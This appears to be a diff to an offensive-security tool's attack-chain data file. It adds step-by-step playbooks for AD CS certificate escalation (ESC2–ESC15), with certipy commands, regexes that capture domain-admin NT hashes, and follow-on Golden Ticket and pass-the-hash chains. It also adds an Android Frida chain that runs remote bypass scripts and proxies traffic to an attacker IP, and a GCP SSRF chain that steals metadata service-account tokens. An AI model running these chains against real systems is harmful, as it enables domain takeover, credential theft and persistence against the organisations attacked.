+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc13",
+          "name": "Find ESC13 templates (OID-linked policies)",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "certipy-find prints `[!] Vulnerabilities: ESC13` and shows the OID\n→ group mapping. Look for groups like \"Enterprise Admins\",\n\"Domain Admins\", \"Backup Operators\".\n",
+          "capture": [
+            {
+              "var": "vuln_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC13",
+              "match": "first"
+            },
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            },
+            {
+              "var": "privileged_group",
+              "regex": "Issuance Policies[\\s\\S]*?\\((CN=[^)]+)\\)",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "request_cert",
+          "name": "Request cert via the policy-linked template",
+          "command_ref": "certipy-esc13",
+          "requires": [
+            "vuln_template",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}",
+            "vulnerable_template": "${vuln_template}"
+          },
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "Authenticate — KDC adds the linked group to your token",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "notes": "`klist tickets` / `whoami /groups` after auth show the new group\nmembership. If the linked group was EA → you can now DCSync.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "ESC13 (Jonas)",
+          "url": "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "privileged group obtained",
+          "reason": "Persist via Golden Ticket."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "NTLM hashes captured via DCSync",
+          "reason": "Spread the harvested hashes."
+        }
+      ]
+    },
+    {
+      "id": "esc15-adcs-ekuwu",
+      "name": "ADCS ESC15 — EKUwu (Application Policies in v1 schema)",
+      "description": "CVE-2024-49019. v1 schema templates (which include `WebServer` by default) ignore the configured EKU when an Application Policy extension is provided in the request. Any v1-enrollable template becomes a path to client-auth (and impersonation via SAN) for low-priv users.\n",
+      "tags": [
+        "adcs",
+        "esc15",
+        "ekuwu",
+        "cve-2024-49019",
+        "priv-esc",
+        "certificates"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc15",
+          "name": "Find ESC15 templates (v1 + Domain Users can enroll)",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "`WebServer` is the canonical example — present on most CAs by default,\nDomain Computers / Authenticated Users can enroll. certipy-find flags\nESC15 explicitly on v1 templates.\n",
+          "capture": [
+            {
+              "var": "vuln_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC15",
+              "match": "first"
+            },
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "request_with_app_policy",
+          "name": "Request cert with Application Policy = Client Auth + SAN=admin",
+          "command_ref": "certipy-esc15",
+          "requires": [
+            "vuln_template",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}",
+            "vulnerable_template": "${vuln_template}"
+          },
+          "notes": "Certipy automatically embeds the Application Policy extension. Without\npatch KB5044277 (Nov 2024) the CA honors it over the template EKU.\n",
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "PKINIT auth → DA NT hash",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "EKUwu (TrustedSec)",
+          "url": "https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc"
+        },
+        {
+          "title": "CVE-2024-49019",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "Golden Ticket."
+        }
+      ]
+    },
+    {
+      "id": "esc2-adcs-any-purpose",
+      "name": "ADCS ESC2 — Any Purpose EKU template",
+      "description": "Template with the `Any Purpose` EKU (OID 2.5.29.37.0) — when enrollable by low-priv, you can request a cert valid for client authentication AND enrollment agent → mint certs for anyone. Plus, you don't need SAN control (unlike ESC1).\n",
+      "tags": [
+        "adcs",
+        "esc2",
+        "priv-esc",
+        "certificates",
+        "active-directory"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc2",
+          "name": "Find templates flagged ESC2",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "Look for `[!] Vulnerabilities: ESC2` and your principal in\n`Enrollment Rights`. Record the template + CA name.\n",
+          "capture": [
+            {
+              "var": "vuln_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC2",
+              "match": "first"
+            },
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "request_anypurpose",
+          "name": "Request cert via Any Purpose template",
+          "command_ref": "certipy-esc2",
+          "requires": [
+            "vuln_template",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}",
+            "vulnerable_template": "${vuln_template}"
+          },
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "Authenticate with the cert",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "Certified Pre-Owned — ESC2",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "Domain admin → Golden Ticket."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Spread the DA hash."
+        }
+      ]
+    },
+    {
+      "id": "esc3-adcs-enrollment-agent",
+      "name": "ADCS ESC3 — Enrollment Agent template chain",
+      "description": "Template with Certificate Request Agent EKU lets you request a cert as ANYONE through a second template that allows enrollment-agent enrollment. Two-cert dance: get the agent cert first, then use it to mint the target cert.\n",
+      "tags": [
+        "adcs",
+        "esc3",
+        "priv-esc",
+        "certificates",
+        "enrollment-agent"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc3",
+          "name": "Find ESC3 template pair (agent + agent-enabled)",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "ESC3 needs TWO templates:\n 1. A template with EKU `Certificate Request Agent` (1.3.6.1.4.1.311.20.2.1)\n    AND your principal in Enrollment Rights.\n 2. A template that allows enrollment by the Enrollment Agent.\ncertipy-find prints both. Record each name.\n",
+          "capture": [
+            {
+              "var": "agent_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC3",
+              "match": "first"
+            },
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "get_agent_cert",
+          "name": "Request the agent certificate",
+          "inline_command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca>' -template '<agent_tpl>'",
+          "requires": [
+            "agent_template",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca": "${ca_name}",
+            "agent_tpl": "${agent_template}"
+          },
+          "capture": [
+            {
+              "var": "agent_pfx",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "use_agent_to_mint",
+          "name": "Use agent cert to mint an Administrator certificate",
+          "command_ref": "certipy-esc3",
+          "requires": [
+            "agent_pfx",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}"
+          },
+          "notes": "Specify `-on-behalf-of '<domain>/administrator'` and `-pfx <agent_pfx>`\nto chain the requests. Resulting PFX authenticates as Administrator.\n",
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "Authenticate as the impersonated identity",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "Certified Pre-Owned — ESC3",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "Golden Ticket persistence."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Spread the recovered hash."
+        }
+      ]
+    },
+    {
+      "id": "esc4-adcs-template-acl",
+      "name": "ADCS ESC4 — vulnerable template ACL (modify-to-ESC1)",
+      "description": "You have GenericAll / GenericWrite / WriteOwner / WriteDacl on a certificate template. Rewrite the template into an ESC1 configuration (ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enrollment), then exploit it as ESC1, then revert.\n",
+      "tags": [
+        "adcs",
+        "esc4",
+        "priv-esc",
+        "certificates",
+        "dacl-abuse",
+        "active-directory"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc4",
+          "name": "Find ESC4 templates (your principal has write rights)",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "Look for `Vulnerabilities: ESC4` plus your principal in `Permissions`\nwith `Full Control` or `Write`.\n",
+          "capture": [
+            {
+              "var": "target_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC4",
+              "match": "first"
+            },
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "save_original",
+          "name": "Save the original template config (CRITICAL — for rollback)",
+          "inline_command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<tpl>' -save-old",
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "tpl": "${target_template}"
+          },
+          "notes": "`-save-old` writes the original ACL/EKUs to <tpl>.json. ALWAYS do\nthis before the next step — otherwise revert is painful.\n"
+        },
+        {
+          "id": "rewrite_to_esc1",
+          "name": "Rewrite template into an ESC1 configuration",
+          "command_ref": "certipy-template",
+          "requires": [
+            "target_template"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "Default behavior (no `-configuration` arg) makes the template into\nthe canonical ESC1 form. Verify with certipy-find again — it should\nnow flag the template as ESC1 too.\n"
+        },
+        {
+          "id": "exploit_as_esc1",
+          "name": "Exploit as ESC1 → cert as Administrator",
+          "command_ref": "certipy-esc1",
+          "requires": [
+            "target_template",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}",
+            "vulnerable_template": "${target_template}",
+            "target_user": "administrator"
+          },
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "Authenticate via PKINIT → DA NT hash",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "restore_template",
+          "name": "RESTORE template (re-apply -save-old config)",
+          "inline_command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<tpl>' -configuration <tpl>.json",
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "tpl": "${target_template}"
+          },
+          "notes": "Roll back the template. Polite for labs and stops anyone else from\nreusing your footing trick.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Certified Pre-Owned — ESC4",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "You hold the DA — persist via Golden Ticket."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Spread the DA hash."
+        }
+      ]
+    },
+    {
+      "id": "esc6-adcs-edituf-global",
+      "name": "ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 global flag",
+      "description": "The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set globally → SAN attributes are accepted in any cert request, regardless of the template's ENROLLEE_SUPPLIES_SUBJECT setting. Every enrollable template becomes an ESC1 candidate.\n",
+      "tags": [
+        "adcs",
+        "esc6",
+        "priv-esc",
+        "certificates"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc6",
+          "name": "Confirm CA has the EDITF flag (certipy CA inspection)",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "Look at the CA section: `User Specified SAN: Enabled` and/or\n`Vulnerabilities: ESC6`. May 2022 patches set this to Disabled by\ndefault — affects mostly older / mis-configured deployments.\n",
+          "capture": [
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            },
+            {
+              "var": "any_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "request_with_san",
+          "name": "Request a cert with Administrator UPN in SAN (any template)",
+          "command_ref": "certipy-esc6",
+          "requires": [
+            "ca_name",
+            "any_template"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}"
+          },
+          "notes": "Use ANY template you can enroll in — User, Machine, anything. The\nEDITF flag globally accepts your `-upn administrator@<domain>`.\n",
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "PKINIT auth → Administrator NT hash",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "Certified Pre-Owned — ESC6",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "Golden Ticket."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Spread DA hash."
+        }
+      ]
+    },
+    {
+      "id": "esc9-adcs-no-security-extension",
+      "name": "ADCS ESC9 — no szOID_NTDS_CA_SECURITY_EXT (UPN remap)",
+      "description": "Post-May-2022 patches added a Security Extension to certs that binds the cert to the requester's SID. When a template has `CT_FLAG_NO_SECURITY_EXTENSION` set (ESC9), this binding is missing — rename your account's UPN to Administrator, request a cert via that template, then PKINIT authenticates you as Administrator.\n",
+      "tags": [
+        "adcs",
+        "esc9",
+        "priv-esc",
+        "certificates",
+        "cve-2022-26931",
+        "cve-2022-26923"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "description": "Your principal (must have write rights on its own UPN — usually GenericWrite on itself or msDS-KeyCredentialLink).",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc9",
+          "name": "Find ESC9 template",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "capture": [
+            {
+              "var": "vuln_template",
+              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC9",
+              "match": "first"
+            },
+            {
+              "var": "ca_name",
+              "regex": "CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "rename_upn",
+          "name": "Set your account's UPN to administrator (write attribute)",
+          "inline_command": "certipy account -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> \\\n  -upn 'administrator' -user '<user>'\n",
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "You need write rights on your own userPrincipalName. If you don't,\nuse shadow-credentials chain on yourself first, then add the agent\nKeyCredential to enable PKINIT-as-self.\n"
+        },
+        {
+          "id": "request_cert",
+          "name": "Request cert through the ESC9 template",
+          "command_ref": "certipy-esc9",
+          "requires": [
+            "vuln_template",
+            "ca_name"
+          ],
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}",
+            "ca_name": "${ca_name}",
+            "vulnerable_template": "${vuln_template}"
+          },
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "restore_upn",
+          "name": "Restore your real UPN",
+          "inline_command": "certipy account -u 'administrator@<domain>' -p '<password>' -dc-ip <dc-ip> \\\n  -upn '<original_upn>' -user '<user>'\n",
+          "inputs": {
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "Restore your principal's original UPN — leaving it as\n'administrator' breaks the real admin's login and screams in logs.\n"
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "Authenticate via PKINIT — server checks UPN at cert-issue time",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "Certipy 4 — ESC9/ESC10 deep-dive",
+          "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "Persist via Golden Ticket."
+        }
+      ]
+    },
+    {
       "id": "file-upload-bypass",
       "name": "Web → Shell — file upload bypass → webshell",
       "description": "Upload form with naive filtering. Try the standard tricks in order (extension blacklist → content-type → magic bytes → double extension → null-byte / .htaccess → polyglot) until one webshell lands and executes.\n",
@@ -1254,6 +2968,200 @@ const CHAIN_DATA = {
           "chain": "windows-priv-esc-recon",
           "when": "shell on Windows IIS",
           "reason": "IIS AppPool → SeImpersonate path."
+        }
+      ]
+    },
+    {
+      "id": "frida-android-hooking",
+      "name": "Mobile — Android app reverse + Frida hook bypass",
+      "description": "Pull the APK, decompile it, identify root/SSL-pinning/cert-bypass logic, hook the runtime with Frida to neutralize the checks, then proxy traffic through Burp to attack the API.\n",
+      "tags": [
+        "mobile",
+        "android",
+        "frida",
+        "ssl-pinning",
+        "reverse-engineering"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "package_name",
+          "description": "App package id (e.g. com.target.app).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "pull_apk",
+          "name": "Pull APK from a rooted/emulated device",
+          "inline_command": "adb shell pm path <pkg>\n# → package:/data/app/.../base.apk\nadb pull /data/app/.../base.apk /tmp/target.apk\n",
+          "inputs": {
+            "pkg": "${package_name}"
+          }
+        },
+        {
+          "id": "decompile",
+          "name": "Decompile with jadx / apktool",
+          "inline_command": "jadx -d /tmp/target_src /tmp/target.apk\n# jadx-gui /tmp/target.apk  (for visual reading)\n# apktool d /tmp/target.apk -o /tmp/target_smali  (for resmoothing)\n"
+        },
+        {
+          "id": "find_sensitive_strings",
+          "name": "Grep for API endpoints, keys, pinning callbacks",
+          "inline_command": "cd /tmp/target_src\ngrep -rn \"https://\" -- '*.java' | head\ngrep -rn \"BuildConfig\\.API_KEY\\|API_KEY\\|SECRET\\|TOKEN\" -- '*.java' | head\n# SSL pinning indicators:\ngrep -rn \"OkHttpClient\\|CertificatePinner\\|TrustManager\\|TrustKit\" -- '*.java' | head\n# Root checks:\ngrep -rn \"su\\|busybox\\|isDeviceRooted\\|RootBeer\\|SafetyNet\" -- '*.java' | head\n"
+        },
+        {
+          "id": "install_frida_server",
+          "name": "Push frida-server to the device (one-time)",
+          "inline_command": "wget https://github.com/frida/frida/releases/latest/download/frida-server-16.0.0-android-arm64.xz -O /tmp/fs.xz\nxz -d /tmp/fs.xz\nadb push /tmp/fs /data/local/tmp/frida-server\nadb shell \"su -c 'chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &'\"\nfrida-ps -U  # confirm\n"
+        },
+        {
+          "id": "bypass_ssl_pinning",
+          "name": "Run universal SSL pinning bypass",
+          "inline_command": "frida -U -l https://raw.githubusercontent.com/m0bilesecurity/RMS-Runtime-Mobile-Security/master/scripts/all-in-one-android-ssl-bypass.js -f <pkg>\n# Or use objection (interactive):\nobjection -g <pkg> explore\n# then: android sslpinning disable\n",
+          "inputs": {
+            "pkg": "${package_name}"
+          }
+        },
+        {
+          "id": "bypass_root_detection",
+          "name": "Bypass root detection (if any)",
+          "inline_command": "frida -U -l https://raw.githubusercontent.com/m0bilesecurity/RMS-Runtime-Mobile-Security/master/scripts/android-root-bypass.js -f <pkg>\n",
+          "inputs": {
+            "pkg": "${package_name}"
+          }
+        },
+        {
+          "id": "configure_proxy",
+          "name": "Proxy traffic through Burp",
+          "inline_command": "# Linux/Wi-Fi: set wifi proxy to <attacker_ip>:8080 in Android settings.\n# Or via adb (USB-tethered):\nadb shell settings put global http_proxy <attacker_ip>:8080\n# Install Burp's CA cert in user store (then move to system store on rooted device).\n"
+        },
+        {
+          "id": "api_attack",
+          "name": "Attack the API like any web app",
+          "inline_command": "echo 'Now Burp/zap see all app traffic. Apply web attack chains: idor, sql-injection, jwt-attacks, csrf, etc.'"
+        }
+      ],
+      "references": [
+        {
+          "title": "OWASP Mobile Testing Guide",
+          "url": "https://owasp.org/www-project-mobile-app-security/"
+        },
+        {
+          "title": "Frida docs",
+          "url": "https://frida.re/docs/home/"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "jwt-attacks",
+          "when": "API uses JWT",
+          "reason": "Once you see the JWT in transit — attack it."
+        },
+        {
+          "chain": "nosql-injection",
+          "when": "API hits MongoDB-style backend",
+          "reason": "Many mobile apps use document stores."
+        }
+      ]
+    },
+    {
+      "id": "gcp-imds-metadata",
+      "name": "Cloud — GCP IMDS → service-account token",
+      "description": "SSRF on a GCP Compute instance reaches metadata.google.internal to steal the attached service account's OAuth2 token. Token's scopes determine reach (cloud-platform = full, devstorage = GCS only, etc.).\n",
+      "tags": [
+        "cloud",
+        "gcp",
+        "ssrf",
+        "imds",
+        "service-account"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "ssrf_url",
+          "description": "Vulnerable URL that fetches arbitrary URLs.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "confirm_gcp",
+          "name": "Confirm we're on GCP (metadata index)",
+          "inline_command": "curl '<url>http://metadata.google.internal/computeMetadata/v1/' \\\n  -H 'Metadata-Flavor: Google'\n# Alternative IPs: 169.254.169.254, metadata.google.internal, 100.100.100.200\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "notes": "`Metadata-Flavor: Google` is REQUIRED. Same anti-SSRF mitigation as\nAzure — SSRFs without header injection are dead in the water.\n"
+        },
+        {
+          "id": "enumerate_metadata",
+          "name": "Enumerate identity + project + scopes",
